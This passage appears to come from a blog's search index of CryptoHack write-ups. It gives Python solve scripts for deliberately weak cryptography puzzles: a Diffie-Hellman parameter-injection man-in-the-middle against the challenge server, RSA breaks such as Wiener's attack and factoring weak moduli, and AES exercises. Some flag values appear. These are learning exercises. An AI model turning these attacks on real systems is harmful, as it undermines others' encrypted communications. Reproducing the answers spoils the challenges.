Bob’s private key and Alice public key. We can have their shared key by doing Ab mod p.Let’s do it with python➜ ~ python3Python 3.8.10 (default, Mar 15 2022, 12:22:08) [GCC 9.4.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&amp;gt;&amp;gt;&amp;gt; A=112218739139542908880564359534373424013016249772931962692237907571990334483528877513809272625610512061159061737608547288558662879685086684299624481742865016924065000555267977830144740364467977206555914781236397216033805882207640219686011643468275165718132888489024688846101943642459655423609111976363316080620471928236879737944217503462265615774774318986375878440978819238346077908864116156831874695817477772477121232820827728424890845769152726027520772901423784&amp;gt;&amp;gt;&amp;gt; b=197395083814907028991785772714920885908249341925650951555219049411298436217190605190824934787336279228785809783531814507661385111220639329358048196339626065676869119737979175531770768861808581110311903548567424039264485661330995221907803300824165469977099494284722831845653985392791480264712091293580274947132480402319812110462641143884577706335859190668240694680261160210609506891842793868297672619625924001403035676872189455767944077542198064499486164431451944&amp;gt;&amp;gt;&amp;gt; p=2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919&amp;gt;&amp;gt;&amp;gt; pow(A,b,p)1547922466740669851136899009270554812141325611574971428561894811681012510829813498961168330963719034921137405736161582760628870855358912091728546731744381382987669929718448423076919613463237884695314172139247244360699127770351428964026451292014069829877638774839374984158095336977179683450837507011404610904412301992397725594661037513152497857482717626617522302677408930050472100106931529654955968569601928777990379536458959945351084885704041496571582522945310187&amp;gt;&amp;gt;&amp;gt; Now, we use decrypt.py to dechipher text.from Crypto.Cipher import AESfrom Crypto.Util.number import bytes_to_longfrom Crypto.Util.Padding import pad, unpadimport hashlibdef is_pkcs7_padded(message): padding = message[-message[-1]:] return all(padding[i] == len(padding) for i in range(0, len(padding)))def decrypt_flag(shared_secret: int, iv: str, ciphertext: str): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#39;ascii&#39;)) key = sha1.digest()[:16] # Decrypt flag ciphertext = bytes.fromhex(ciphertext) iv = bytes.fromhex(iv) cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) if is_pkcs7_padded(plaintext): return unpad(plaintext, 16).decode(&#39;ascii&#39;) else: return plaintext.decode(&#39;ascii&#39;)shared_secret = 1547922466740669851136899009270554812141325611574971428561894811681012510829813498961168330963719034921137405736161582760628870855358912091728546731744381382987669929718448423076919613463237884695314172139247244360699127770351428964026451292014069829877638774839374984158095336977179683450837507011404610904412301992397725594661037513152497857482717626617522302677408930050472100106931529654955968569601928777990379536458959945351084885704041496571582522945310187iv = &#39;737561146ff8194f45290f5766ed6aba&#39;ciphertext = &#39;39c99bf2f0c14678d6a5416faef954b5893c316fc3c48622ba1fd6a9fe85f3dc72a29c394cf4bc8aff6a7b21cae8e12c&#39;print(decrypt_flag(shared_secret, iv, ciphertext))" }, { "title": "CryptoHack - Parameter Injection", "url": "/posts/parameter-injection/", "categories": "CryptoHack", "tags": "Challenge, AES, crypto, Diffie-Hellman, MITM", "date": "2022-06-21 00:00:00 +0000", "snippet": "challenge link : https://cryptohack.org/courses/public-key/parameter_injection/Instruction :You’re in a position to not only intercept Alice and Bob’s DH key exchange, but also rewrite their messages. Think about how you can play with the DH equation that they calculate, and therefore sidestep the need to crack any discrete logarithm problem.Use the script from “Diffie-Hellman Starter 5” to decrypt the flag once you’ve recovered the shared secret.Connect at nc socket.cryptohack.org 13371Solution :We can rewrite Alice’s Data and send it to bob.If we change Alice’s public key and set it to ‘0’, Bob will do 0Bob Private Key mod p. The result will be always 0 because 0anything=0.We do the same for Alice and Alice will do BAlice private key mod p and the result will be 0 too.After that we know that the shared key is 0 and we can decipher the text thanks to the given function.Let’s automate the process with python :from pwn import * # pip install pwntoolsimport jsonr = remote(&#39;socket.cryptohack.org&#39;, 13371)alice=r.recvline().decode().split(&#39;Intercepted from Alice: &#39;)[1] #We store only jsonalice=json.loads(alice)alice[&#39;A&#39;]=hex(0) #change Alice result to 0request = json.dumps(alice).encode()r.sendline(request)#send itbob=r.recvline().decode().split(&#39;Intercepted from Bob: &#39;)[1]bob=json.loads(bob)bob[&#39;B&#39;]=hex(0) #change bob result to 0request = json.dumps(bob).encode()r.sendline(request) #send itresult=r.recvline().decode().split(&#39;Intercepted from Alice: &#39;)[1]result=json.loads(result) #Reading the result###Starter 5 decrypt.pyfrom Crypto.Cipher import AESfrom Crypto.Util.number import bytes_to_longfrom Crypto.Util.Padding import pad, unpadimport hashlibdef is_pkcs7_padded(message): padding = message[-message[-1]:] return all(padding[i] == len(padding) for i in range(0, len(padding)))def decrypt_flag(shared_secret: int, iv: str, ciphertext: str): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#39;ascii&#39;)) key = sha1.digest()[:16] # Decrypt flag ciphertext = bytes.fromhex(ciphertext) iv = bytes.fromhex(iv) cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) if is_pkcs7_padded(plaintext): return unpad(plaintext, 16).decode(&#39;ascii&#39;) else: return plaintext.decode(&#39;ascii&#39;)shared_secret = 0 #We know that shared key is 0iv = result[&#39;iv&#39;]ciphertext = result[&#39;encrypted_flag&#39;]print(decrypt_flag(shared_secret, iv, ciphertext))" }, { "title": "CryptoHack - Square Eyes", "url": "/posts/square/", "categories": "CryptoHack", "tags": "Challenge, RSA, crypto, math, modular math, factorization, prime", "date": "2022-06-20 00:00:00 +0000", "snippet": "Instruction:It was taking forever to get a 2048 bit prime, so I just generated one and used it twice.If you’re stuck, look again at the formula for Euler’s totient.output.txt Solution:Going to alperton we find the square root of n.One prime was used so p=q.We haven=535860808044009550029177135708168016201451343147313565371014459027743491739422885443084705720731409713775527993719682583669164873806842043288439828071789970694759080842162253955259590552283047728782812946845160334801782088068154453021936721710269050985805054692096738777321796153384024897615594493453068138341203673749514094546000253631902991617197847584519694152122765406982133526594928685232381934742152195861380221224370858128736975959176861651044370378539093990198336298572944512738570839396588590096813217791191895941380464803377602779240663133834952329316862399581950590588006371221334128215409197603236942597674756728212232134056562716399155080108881105952768189193728827484667349378091100068224404684701674782399200373192433062767622841264055426035349769018117299620554803902490432339600566432246795818167460916180647394169157647245603555692735630862148715428791242764799469896924753470539857080767170052783918273180304835318388177089674231640910337743789750979216202573226794240332797892868276309400253925932223895530714169648116569013581643192341931800785254715083294526325980247219218364118877864892068185905587410977152737936310734712276956663192182487672474651103240004173381041237906849437490609652395748868434296753449tot=535860808044009550029177135708168016201451343147313565371014459027743491739422885443084705720731409713775527993719682583669164873806842043288439828071789970694759080842162253955259590552283047728782812946845160334801782088068154453021936721710269050985805054692096738777321796153384024897615594493453068138341203673749514094546000253631902991617197847584519694152122765406982133526594928685232381934742152195861380221224370858128736975959176861651044370378539093990198336298572944512738570839396588590096813217791191895941380464803377602779240663133834952329316862399581950590588006371221334128215409197603236942597651608060690234036335705547571364308771218622236419753716368260075312323208925165621274595020106151011545303170088673955783637728000006368618441577851397291117278852276751456673581537259869142647565020542601054101592626979471652148045512873105710848212696049590598146618028726176022064472885308197519317747407844090058947875932743288385669422058071198645023972308446438441153760076841945603977769925845681533446707211489566222617639780808415989767055224710476934217946203991783011923589436153032821374318934664948734241916165293199239421187811219925563553951174217103495479052728970340083104948916701180651802914100342Now, we can compute d which is e-1 mod tot and get the flagn=535860808044009550029177135708168016201451343147313565371014459027743491739422885443084705720731409713775527993719682583669164873806842043288439828071789970694759080842162253955259590552283047728782812946845160334801782088068154453021936721710269050985805054692096738777321796153384024897615594493453068138341203673749514094546000253631902991617197847584519694152122765406982133526594928685232381934742152195861380221224370858128736975959176861651044370378539093990198336298572944512738570839396588590096813217791191895941380464803377602779240663133834952329316862399581950590588006371221334128215409197603236942597674756728212232134056562716399155080108881105952768189193728827484667349378091100068224404684701674782399200373192433062767622841264055426035349769018117299620554803902490432339600566432246795818167460916180647394169157647245603555692735630862148715428791242764799469896924753470539857080767170052783918273180304835318388177089674231640910337743789750979216202573226794240332797892868276309400253925932223895530714169648116569013581643192341931800785254715083294526325980247219218364118877864892068185905587410977152737936310734712276956663192182487672474651103240004173381041237906849437490609652395748868434296753449e=65537ct=222502885974182429500948389840563415291534726891354573907329512556439632810921927905220486727807436668035929302442754225952786602492250448020341217733646472982286222338860566076161977786095675944552232391481278782019346283900959677167026636830252067048759720251671811058647569724495547940966885025629807079171218371644528053562232396674283745310132242492367274184667845174514466834132589971388067076980563188513333661165819462428837210575342101036356974189393390097403614434491507672459254969638032776897417674577487775755539964915035731988499983726435005007850876000232292458554577437739427313453671492956668188219600633325930981748162455965093222648173134777571527681591366164711307355510889316052064146089646772869610726671696699221157985834325663661400034831442431209123478778078255846830522226390964119818784903330200488705212765569163495571851459355520398928214206285080883954881888668509262455490889283862560453598662919522224935145694435885396500780651530829377030371611921181207362217397805303962112100190783763061909945889717878397740711340114311597934724670601992737526668932871436226135393872881664511222789565256059138002651403875484920711316522536260604255269532161594824301047729082877262812899724246757871448545439896tot=535860808044009550029177135708168016201451343147313565371014459027743491739422885443084705720731409713775527993719682583669164873806842043288439828071789970694759080842162253955259590552283047728782812946845160334801782088068154453021936721710269050985805054692096738777321796153384024897615594493453068138341203673749514094546000253631902991617197847584519694152122765406982133526594928685232381934742152195861380221224370858128736975959176861651044370378539093990198336298572944512738570839396588590096813217791191895941380464803377602779240663133834952329316862399581950590588006371221334128215409197603236942597651608060690234036335705547571364308771218622236419753716368260075312323208925165621274595020106151011545303170088673955783637728000006368618441577851397291117278852276751456673581537259869142647565020542601054101592626979471652148045512873105710848212696049590598146618028726176022064472885308197519317747407844090058947875932743288385669422058071198645023972308446438441153760076841945603977769925845681533446707211489566222617639780808415989767055224710476934217946203991783011923589436153032821374318934664948734241916165293199239421187811219925563553951174217103495479052728970340083104948916701180651802914100342d=pow(e,-1,tot)decrypt=pow(ct,d,n)print(long_to_bytes(decrypt))Read previous articles for more details. Thank you." }, { "title": "CryptoHack - Salty", "url": "/posts/salty/", "categories": "CryptoHack", "tags": "Challenge, RSA, crypto, math, modular math", "date": "2022-06-20 00:00:00 +0000", "snippet": "challenge link : https://cryptohack.org/courses/public-key/salty/ Instruction :Smallest exponent should be fastest, right?salty.pyoutput.txtSolutionThanks to this StackOverflow discussion we easily understand the problem. In fact, d=e-1 mod tot(n) which means d*e=1 mod tot(n). But if e=1 we have d*1=1 mod tot(n).So, d=1 mod tot(n)Since we have d we can get the flag.from Crypto.Util.number import long_to_bytesn=110581795715958566206600392161360212579669637391437097703685154237017351570464767725324182051199901920318211290404777259728923614917211291562555864753005179326101890427669819834642007924406862482343614488768256951616086287044725034412802176312273081322195866046098595306261781788276570920467840172004530873767e=1ct=44981230718212183604274785925793145442655465025264554046028251311164494127485decrypt=pow(ct,1,n)print(long_to_bytes(decrypt))" }, { "title": "CryptoHack - Monoprime", "url": "/posts/monoprime/", "categories": "CryptoHack", "tags": "Challenge, RSA, crypto, math, modular math, factorization, prime", "date": "2022-06-20 00:00:00 +0000", "snippet": "challenge link : https://cryptohack.org/courses/public-key/monoprime/Instructions:Why is everyone so obsessed with multiplying two primes for RSA. Why not just use one?output.txtSolution :If he use only one prime then p=q.Looking at these discussion we have :.Let’s check if n is prime thanks to Fermat’s little theorem.def fermat(nb): for i in range(300): if pow(getPrime(100),nb-1,nb)!=1: return False return Trueprint(fermat(n))output: Truetot(n) is the number of prime number with n. Since n is prime then all numbers in the set are prime to n. We therefore have n-1 prime element with n .tot(n)=n-1n=171731371218065444125482536302245915415603318380280392385291836472299752747934607246477508507827284075763910264995326010251268493630501989810855418416643352631102434317900028697993224868629935657273062472544675693365930943308086634291936846505861203914449338007760990051788980485462592823446469606824421932591tot(n)=n-1d=e-1 mod tot(n)from Crypto.Util.number import long_to_bytesn=171731371218065444125482536302245915415603318380280392385291836472299752747934607246477508507827284075763910264995326010251268493630501989810855418416643352631102434317900028697993224868629935657273062472544675693365930943308086634291936846505861203914449338007760990051788980485462592823446469606824421932591tot=n-1e=65537ct=161367550346730604451454756189028938964941280347662098798775466019463375610700074840105776873791605070092554650190486030367121011578171525759600774739890458414593857709994072516290998135846956596662071379067305011746842247628316996977338024343628757374524136260758515864509435302781735938531030576289086798942d=pow(e,-1,tot)decrypt=pow(ct,d,n)print(long_to_bytes(decrypt))" }, { "title": "CryptoHack - Manyprimes", "url": "/posts/manyprimes/", "categories": "CryptoHack", "tags": "Challenge, RSA, crypto, math, modular math, factorization", "date": "2022-06-20 00:00:00 +0000", "snippet": "Instructions :We have a supercomputer at work, so I’ve made sure my encryption is secure by picking massive numbers!source.pyoutput.txtSolution:We have to factorise n to get Euler’s totient.Using alperton we can try to factor n. After 3 minutes of computing we get :We have all factors, we can do (first_factor-1)*(second_factor-1)…(last_factor-1) to have Euler’s totient but the website calculated it for us.Now, we copy&amp;amp;paste the computed totient and compute d as e-1 mod n and get the flag.from Crypto.Util.number import long_to_bytesimport mathn=580642391898843192929563856870897799650883152718761762932292482252152591279871421569162037190419036435041797739880389529593674485555792234900969402019055601781662044515999210032698275981631376651117318677368742867687180140048715627160641771118040372573575479330830092989800730105573700557717146251860588802509310534792310748898504394966263819959963273509119791037525504422606634640173277598774814099540555569257179715908642917355365791447508751401889724095964924513196281345665480688029639999472649549163147599540142367575413885729653166517595719991872223011969856259344396899748662101941230745601719730556631637e=65537ct=320721490534624434149993723527322977960556510750628354856260732098109692581338409999983376131354918370047625150454728718467998870322344980985635149656977787964380651868131740312053755501594999166365821315043312308622388016666802478485476059625888033017198083472976011719998333985531756978678758897472845358167730221506573817798467100023754709109274265835201757369829744113233607359526441007577850111228850004361838028842815813724076511058179239339760639518034583306154826603816927757236549096339501503316601078891287408682099750164720032975016814187899399273719181407940397071512493967454225665490162619270814464tot=&#39;580642 391898 843191 487404 652150 193463 439642 600155 214610 402815 446275 117822 457602 964108 279991 178253 399797 937961 990567 828910 318944 376020 941874 995912 942457 183778 540787 232677 949141 800666 918857 974957 805860 863128 934894 322453 334083 108951 829885 566055 541321 469492 863749 601696 156719 452204 625091 396670 183612 468234 453545 730714 411260 422415 053794 985900 973204 357184 470104 831581 957188 055965 458235 216412 636167 147716 884241 110058 234315 146752 181551 500634 472836 779298 794303 330378 218517 375396 697137 335380 548442 818167 481491 481087 606998 467945 980408 909917 714107 491743 183639 877866 494931 448463 312524 563384 587536 906823 474872 320000 000000 000000&#39;tot=int(&#39;&#39;.join(tot.split(&#39; &#39;)))d=pow(e,-1,tot)decrypt=pow(ct,d,n)print(long_to_bytes(decrypt))" }, { "title": "CryptoHack - Infinite Descent", "url": "/posts/infinite-descent/", "categories": "CryptoHack", "tags": "Challenge, RSA, crypto, math, modular math, factorization", "date": "2022-06-20 00:00:00 +0000", "snippet": "Instructions :Finding large primes is slow, so I’ve devised an optimisation.descent.pyoutput.txtDescent.py#!/usr/bin/env python3import randomfrom Crypto.Util.number import bytes_to_long, isPrimeFLAG = b&quot;crypto{???????????????????}&quot;def getPrimes(bitsize): r = random.getrandbits(bitsize) p, q = r, r while not isPrime(p): p += random.getrandbits(bitsize//4) while not isPrime(q): q += random.getrandbits(bitsize//8) return p, qm = bytes_to_long(FLAG)p, q = getPrimes(2048)n = p * qe = 0x10001c = pow(m, e, n)print(f&quot;n = {n}&quot;)print(f&quot;e = {e}&quot;)print(f&quot;c = {c}&quot;)output.txtn = 383347712330877040452238619329524841763392526146840572232926924642094891453979246383798913394114305368360426867021623649667024217266529000859703542590316063318592391925062014229671423777796679798747131250552455356061834719512365575593221216339005132464338847195248627639623487124025890693416305788160905762011825079336880567461033322240015771102929696350161937950387427696385850443727777996483584464610046380722736790790188061964311222153985614287276995741553706506834906746892708903948496564047090014307484054609862129530262108669567834726352078060081889712109412073731026030466300060341737504223822014714056413752165841749368159510588178604096191956750941078391415634472219765129561622344109769892244712668402761549412177892054051266761597330660545704317210567759828757156904778495608968785747998059857467440128156068391746919684258227682866083662345263659558066864109212457286114506228470930775092735385388316268663664139056183180238043386636254075940621543717531670995823417070666005930452836389812129462051771646048498397195157405386923446893886593048680984896989809135802276892911038588008701926729269812453226891776546037663583893625479252643042517196958990266376741676514631089466493864064316127648074609662749196545969926051e = 65537c = 98280456757136766244944891987028935843441533415613592591358482906016439563076150526116369842213103333480506705993633901994107281890187248495507270868621384652207697607019899166492132408348789252555196428608661320671877412710489782358282011364127799563335562917707783563681920786994453004763755404510541574502176243896756839917991848428091594919111448023948527766368304503100650379914153058191140072528095898576018893829830104362124927140555107994114143042266758709328068902664037870075742542194318059191313468675939426810988239079424823495317464035252325521917592045198152643533223015952702649249494753395100973534541766285551891859649320371178562200252228779395393974169736998523394598517174182142007480526603025578004665936854657294541338697513521007818552254811797566860763442604365744596444735991732790926343720102293453429936734206246109968817158815749927063561835274636195149702317415680401987150336994583752062565237605953153790371155918439941193401473271753038180560129784192800351649724465553733201451581525173536731674524145027931923204961274369826379325051601238308635192540223484055096203293400419816024111797903442864181965959247745006822690967920957905188441550106930799896292835287867403979631824085790047851383294389Solution :Here we see that the user try to find a prime number by himself. Generating a prime number is difficult. Maybe his program failed and his number is not prime.With alpertron we can check if a number is prime or not.Clicking the “Prime” button we see that n is not prime !Let’s try to factorize it to retrieve n Euler’s totient.Wow ! After 2 seconds we have p and q !We can compute tot(n) which is (p-1)*(q-1).Alpertron did the math for us.Euler&#39;s totient: 383 347712 330877 040452 238619 329524 841763 392526 146840 572232 926924 642094 891453 979246 383798 913394 114305 368360 426867 021623 649667 024217 266529 000859 703542 590316 063318 592391 925062 014229 671423 777796 679798 747131 250552 455356 061834 719512 365575 593221 216339 005132 464338 847195 248627 639623 487124 025890 693416 305788 160905 762011 825079 336880 567461 033322 240015 771102 929696 350161 937950 387427 696385 850443 727777 996483 584464 610046 380722 736790 790188 061964 311222 153985 614287 276995 741553 706506 834906 746892 708903 948496 564047 090014 307484 054609 862129 530262 108669 567834 726352 078060 081889 712109 412073 731026 030466 300060 341737 504223 822014 714056 413752 126683 214547 210091 390679 974594 283534 409697 353269 403167 247339 061084 988048 579364 531632 101433 020183 194468 283153 033890 703002 087973 385851 417790 266280 499708 266344 223641 316926 576294 365165 329347 064523 975790 670588 810818 699922 179788 777857 170439 166954 960703 459198 529275 452877 513873 057382 770768 245397 145016 125891 706702 616839 846581 497389 530380 476502 301836 798763 392640 359463 913664 694387 882032 507902 993040 076634 403215 964044 533033 051743 329783 326275 960406 613436 618673 703137 751078 621791 878904 659539 323881 991701 429815 539158 631194 285131 479771 286920 247793 977358 272614 673235 455213 699514 908669 035434 237697 206139 833951 794028 820271 248992 213600We know that d is the inverse of e mod tot(n).Using python we can find d easily :from Crypto.Util.number import long_to_bytes#I copied tot from the website and removed spaces to have an integer.tottot=int(&#39;&#39;.join(tot.split(&#39; &#39;)))n=383347712330877040452238619329524841763392526146840572232926924642094891453979246383798913394114305368360426867021623649667024217266529000859703542590316063318592391925062014229671423777796679798747131250552455356061834719512365575593221216339005132464338847195248627639623487124025890693416305788160905762011825079336880567461033322240015771102929696350161937950387427696385850443727777996483584464610046380722736790790188061964311222153985614287276995741553706506834906746892708903948496564047090014307484054609862129530262108669567834726352078060081889712109412073731026030466300060341737504223822014714056413752165841749368159510588178604096191956750941078391415634472219765129561622344109769892244712668402761549412177892054051266761597330660545704317210567759828757156904778495608968785747998059857467440128156068391746919684258227682866083662345263659558066864109212457286114506228470930775092735385388316268663664139056183180238043386636254075940621543717531670995823417070666005930452836389812129462051771646048498397195157405386923446893886593048680984896989809135802276892911038588008701926729269812453226891776546037663583893625479252643042517196958990266376741676514631089466493864064316127648074609662749196545969926051e=65537c=98280456757136766244944891987028935843441533415613592591358482906016439563076150526116369842213103333480506705993633901994107281890187248495507270868621384652207697607019899166492132408348789252555196428608661320671877412710489782358282011364127799563335562917707783563681920786994453004763755404510541574502176243896756839917991848428091594919111448023948527766368304503100650379914153058191140072528095898576018893829830104362124927140555107994114143042266758709328068902664037870075742542194318059191313468675939426810988239079424823495317464035252325521917592045198152643533223015952702649249494753395100973534541766285551891859649320371178562200252228779395393974169736998523394598517174182142007480526603025578004665936854657294541338697513521007818552254811797566860763442604365744596444735991732790926343720102293453429936734206246109968817158815749927063561835274636195149702317415680401987150336994583752062565237605953153790371155918439941193401473271753038180560129784192800351649724465553733201451581525173536731674524145027931923204961274369826379325051601238308635192540223484055096203293400419816024111797903442864181965959247745006822690967920957905188441550106930799896292835287867403979631824085790047851383294389d=pow(e,-1,tot)decipher=pow(c,d,n)print(long_to_bytes(decipher))" }, { "title": "CryptoHack - Everything is Big", "url": "/posts/everything-is-big/", "categories": "CryptoHack", "tags": "Challenge, RSA, crypto, math, modular math, factorization, wiener attack", "date": "2022-06-20 00:00:00 +0000", "snippet": "Instructions :We have a supercomputer at work, so I’ve made sure my encryption is secure by picking massive numbers!source.pyoutput.txtSolution :Here is the content of source.py#!/usr/bin/env python3from Crypto.Util.number import getPrime, bytes_to_longFLAG = b&quot;crypto{?????????????????????????}&quot;m = bytes_to_long(FLAG)def get_huge_RSA(): p = getPrime(1024) q = getPrime(1024) N = p*q phi = (p-1)*(q-1) while True: d = getPrime(256) e = pow(d,-1,phi) if e.bit_length() == N.bit_length(): break return N,eN, e = get_huge_RSA()c = pow(m, e, N)print(f&#39;N = {hex(N)}&#39;)print(f&#39;e = {hex(e)}&#39;)print(f&#39;c = {hex(c)}&#39;)output.txtN = 0xb8af3d3afb893a602de4afe2a29d7615075d1e570f8bad8ebbe9b5b9076594cf06b6e7b30905b6420e950043380ea746f0a14dae34469aa723e946e484a58bcd92d1039105871ffd63ffe64534b7d7f8d84b4a569723f7a833e6daf5e182d658655f739a4e37bd9f4a44aff6ca0255cda5313c3048f56eed5b21dc8d88bf5a8f8379eac83d8523e484fa6ae8dbcb239e65d3777829a6903d779cd2498b255fcf275e5f49471f35992435ee7cade98c8e82a8beb5ce1749349caa16759afc4e799edb12d299374d748a9e3c82e1cc983cdf9daec0a2739dadcc0982c1e7e492139cbff18c5d44529407edfd8e75743d2f51ce2b58573fea6fbd4fe25154b9964de = 0x9ab58dbc8049b574c361573955f08ea69f97ecf37400f9626d8f5ac55ca087165ce5e1f459ef6fa5f158cc8e75cb400a7473e89dd38922ead221b33bc33d6d716fb0e4e127b0fc18a197daf856a7062b49fba7a86e3a138956af04f481b7a7d481994aeebc2672e500f3f6d8c581268c2cfad4845158f79c2ef28f242f4fa8f6e573b8723a752d96169c9d885ada59cdeb6dbe932de86a019a7e8fc8aeb07748cfb272bd36d94fe83351252187c2e0bc58bb7a0a0af154b63397e6c68af4314601e29b07caed301b6831cf34caa579eb42a8c8bf69898d04b495174b5d7de0f20cf2b8fc55ed35c6ad157d3e7009f16d6b61786ee40583850e67af13e9d25be3c = 0x3f984ff5244f1836ed69361f29905ca1ae6b3dcf249133c398d7762f5e277919174694293989144c9d25e940d2f66058b2289c75d1b8d0729f9a7c4564404a5fd4313675f85f31b47156068878e236c5635156b0fa21e24346c2041ae42423078577a1413f41375a4d49296ab17910ae214b45155c4570f95ca874ccae9fa80433a1ab453cbb28d780c2f1f4dc7071c93aff3924d76c5b4068a0371dff82531313f281a8acadaa2bd5078d3ddcefcb981f37ff9b8b14c7d9bf1accffe7857160982a2c7d9ee01d3e82265eec9c7401ecc7f02581fd0d912684f42d1b71df87a1ca51515aab4e58fab4da96e154ea6cdfb573a71d81b2ea4a080a1066e1bc3474I could not find any vulnerabilities but after several searches I found this. The article state that if we have a small d we can retrieve it thanks to Wiener attack.Our d is a 256 bits prime number, i don’t really now if it’s small but we can try Wiener’s attack.Using this github repo i filled e, n and c into attack.py anddddd➜ wiener git:(master) ✗ python2 attack.pyHacked!d = 79434351637397000170240219617391501050474168352481334243649813782018808904459p = 11515195063862319002386785506490949575337279649825636153248053928580408574830461➜ wiener git:(master) ✗ Perfect ! d is the secret key and p the deciphered text.Let’s convert it to bytes.decrypt=11515195063862319002386785506490949575337279649825636153248053928580408574830461print(long_to_bytes(decrypt))Voilà !" }, { "title": "CryptoHack - RSA Starter 6", "url": "/posts/RSA-STARTER-06/", "categories": "CryptoHack", "tags": "Challenge, RSA, crypto", "date": "2022-06-19 00:00:00 +0000", "snippet": "challenge link : https://cryptohack.org/courses/public-key/rsa_starter_6/Instructions :Sign the flag crypto{Immut4ble_m3ssag1ng} using your private key and the SHA256 hash function.Cryptohack provides us a file named private.keySolutionI didn’t do any writeup about RSA start 1 to 5 because they were very easy. This one is also easy but talks about signing with RSA which I had never heard of before.We have a file with a private key:N = 15216583654836731327639981224133918855895948374072384050848479908982286890723874753306371990452491305564061051059885803d=11175901210643014262548222473449533091378848269490518850474399681690547281641491667690491585550160457893350536334242689We have to hash “crypto{Immut4ble_m3ssag1ng}” with SHA-256 and encrypt it with our private key.Short python code to solve the challenge :from hashlib import sha256from Cryptodome.PublicKey import RSAhashed=int(sha256(&#39;crypto{Immut4ble_m3ssag1ng}&#39;.encode()).hexdigest(),16) #Hashing the text and convert in base16 to encrypt itfile= open(&#39;private.key&#39;).read().splitlines() n=file[0].split(&#39;= &#39;)[1] #parsing file to get nd=file[1].split(&quot;= &quot;)[1] #parsing file to get dsign=pow(hashed,int(d),int(n)) #encrypt itsign=hex(sign) #convert to hexprint(sign.split(&#39;x&#39;)[1]) #print result" }, { "title": "CryptoHack - Inferius Prime", "url": "/posts/Inferius-prime/", "categories": "CryptoHack", "tags": "Challenge, RSA, crypto, math, modular math, factorization", "date": "2022-06-19 00:00:00 +0000", "snippet": "Instructions:Here is my super-strong RSA implementation, because it’s 1600 bits strong it should be unbreakable… at least I think so!inferius.pyoutput.txtInferius.py :#!/usr/bin/env python3from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytes, GCDe = 3# n will be 8 * (100 + 100) = 1600 bits strong which is pretty goodwhile True: p = getPrime(100) q = getPrime(100) phi = (p - 1) * (q - 1) d = inverse(e, phi) if d != -1 and GCD(e, phi) == 1: breakn = p * qflag = b&quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;pt = bytes_to_long(flag)ct = pow(pt, e, n)print(f&quot;n = {n}&quot;)print(f&quot;e = {e}&quot;)print(f&quot;ct = {ct}&quot;)pt = pow(ct, d, n)decrypted = long_to_bytes(pt)assert decrypted == flagoutput.txtn = 742449129124467073921545687640895127535705902454369756401331e = 3ct = 39207274348578481322317340648475596807303160111338236677373SolutionWe notice that p and q are generated with getPrime() so we cannot guess them.Using this powerful website we can try to factor n. If we succeed we can find tot(n) and therefore find d.Perfect ! We have p and q and the website also computed Euler’s totient (p-1*q-1) for us.We have tot(n) and e. We are able to compute d which is e-1 mod tot(n) and then find the flag.Doing it with python :from Crypto.Util.number import long_to_bytesn=742449129124467073921545687640895127535705902454369756401331e=3tot=742449129124467073921545687639156049064283454870081476956200 #(p-1)*(q-1)ct=39207274348578481322317340648475596807303160111338236677373d=pow(e,-1,tot) # inverse of e mod ndecipher=pow(ct,d,n)ans=long_to_bytes(decipher)print(ans)" }, { "title": "CryptoHack - Structure of AES", "url": "/posts/CRYPTOHACK-structure-of-aes/", "categories": "CryptoHack", "tags": "Challenge, AES, crypto", "date": "2022-06-17 00:00:00 +0000", "snippet": "challenge link : https://cryptohack.org/courses/symmetric/aes2/Instructions :Included is a bytes2matrix function for converting our initial plaintext block into a state matrix. Write a matrix2bytes function to turn that matrix back into bytes, and submit the resulting plaintext as the flag.Here is the given code :def bytes2matrix(text): &quot;&quot;&quot; Converts a 16-byte array into a 4x4 matrix. &quot;&quot;&quot; return [list(text[i:i+4]) for i in range(0, len(text), 4)]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; ????matrix = [ [99, 114, 121, 112], [116, 111, 123, 105], [110, 109, 97, 116], [114, 105, 120, 125],]print(matrix2bytes(matrix))SolutionThe bytes2matrix function make block of four bytes with our text and add the ascii value of each character into a 4*4 matrix.We have to take each integer and convert them to characters using ascii tablesLet’s do it.def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; res=b&#39;&#39; for i in matrix: for j in i: res+=chr(j).encode() return resDone, we now have the flag." }, { "title": "CryptoHack - Round Keys", "url": "/posts/CRYPTOHACK-ROUND-KEY/", "categories": "CryptoHack", "tags": "Challenge, AES, crypto", "date": "2022-06-17 00:00:00 +0000", "snippet": "Challenge link : https://cryptohack.org/courses/symmetric/aes3/Instructions :You have to complete the add_round_key function, then use the matrix2bytes function to get your next flag.Here is the given code :state = [ [206, 243, 61, 34], [171, 11, 93, 31], [16, 200, 91, 108], [150, 3, 194, 51],]round_key = [ [173, 129, 68, 82], [223, 100, 38, 109], [32, 189, 53, 8], [253, 48, 187, 78],]def add_round_key(s, k): ????SolutionSo, we have to complete the add_round_key fonction. All we have to do is xor state with round_key one per one. xor(state[0][0], round_key[0][0]) xor(state[1][1], round_key[1][1])And add results to a 4*4 matrix.Afterward, we convert our matrix into bytes to get the flag.python function to xor state and key one per one :def add_round_key(s, k): final=[] for i in range(len(s)): tmp=[] for j in range(len(s)): tmp.append(xor(s[i][j],k[i][j])) final.append(tmp) return finalBy running this function with state and round_key as parameters we have :[[99, 114, 121, 112], [116, 111, 123, 114], [48, 117, 110, 100], [107, 51, 121, 125]]Now, let’s convert all these characters to string with matrix2bytesfunction.def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; res=b&#39;&#39; for i in matrix: for j in i: res+=chr(j).encode() return resPerfect, we now have the flag." }, { "title": "CryptoHack - No way jose", "url": 